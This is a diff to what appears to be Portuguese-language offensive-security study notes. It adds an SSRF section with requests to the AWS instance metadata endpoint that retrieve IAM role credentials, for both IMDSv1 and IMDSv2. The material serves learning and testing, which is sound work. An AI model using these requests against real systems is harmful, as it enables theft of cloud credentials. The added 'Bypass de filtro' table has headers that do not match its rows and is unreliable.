@@ -308,6 +308,40 @@ Se o conteúdo interno voltar na resposta (basic) ou se o tempo/erro mudar (semi
 
 <br>
 
+`Cloud Metadata`
+
+AWS — IMDSv1 (legado, sem proteção): basta um GET. Segundo a doc oficial da AWS, se nenhum header especial estiver presente, a requisição é tratada como IMDSv1:
+
+```bash
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# devolve o NOME da role, ex.: minha-role-ec2
+
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/minha-role-ec2
+# devolve AccessKeyId, SecretAccessKey e Token (credencial temporária!)
+```
+
+AWS — IMDSv2 (session-oriented, com defesa): a doc da AWS exige um token de sessão obtido via PUT antes de qualquer GET :
+
+```bash
+# 1) Pega o token (PUT com header de TTL — máximo 21600s = 6h)
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+# 2) Usa o token no GET
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+<br>
+
+`Bypass de filtro:`
+
+| Técnica | Exemplo | Por que fura |
+|------|----------|------------|
+| Basic / in-band | Sim | Conteúdo interno aparece na resposta |
+| Semi-blind | Parcial |código na linguagem da app → SO |
+| Blind |Não |  Interação OAST (DNS/HTTP no seu servidor) |
+
+<br>
+
 **🐞 ATO**
 
 *   Fluxo de senha: telas de "esqueci a senha", "alterar senha", links de reset no email. Capture cada parâmetro da request (login, e-mail,  user_id , token , code ).
